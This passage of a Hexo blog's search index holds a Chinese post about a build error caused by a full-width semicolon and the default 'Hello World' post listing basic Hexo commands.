      <link href="/2022/09/20/%E5%8D%83%E4%B8%87%E8%A6%81%E6%B3%A8%E6%84%8F%E4%B8%AD%E8%8B%B1%E6%96%87%EF%BC%81%E5%95%8A%EF%BC%81%E5%95%8A%EF%BC%81/"/>
      <url>/2022/09/20/%E5%8D%83%E4%B8%87%E8%A6%81%E6%B3%A8%E6%84%8F%E4%B8%AD%E8%8B%B1%E6%96%87%EF%BC%81%E5%95%8A%EF%BC%81%E5%95%8A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>  由于是第一次搭博客，遇到了很多问题。特别是在hexo g出错时，作为小白本白的我不出意外的被卡住了，看着天书一般的代码，我头皮发麻<br>……被将近卡住了半小时，哈哈，希望别笑我最终发现在最后的一个分号“;”我用成了中文字符导致出错，我给大家看看区别   英文“;”，中文“；”<br>中文字符更宽，呜呜呜！希望以后别碰到这种事……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/09/20/hello-world/"/>
      <url>/2022/09/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
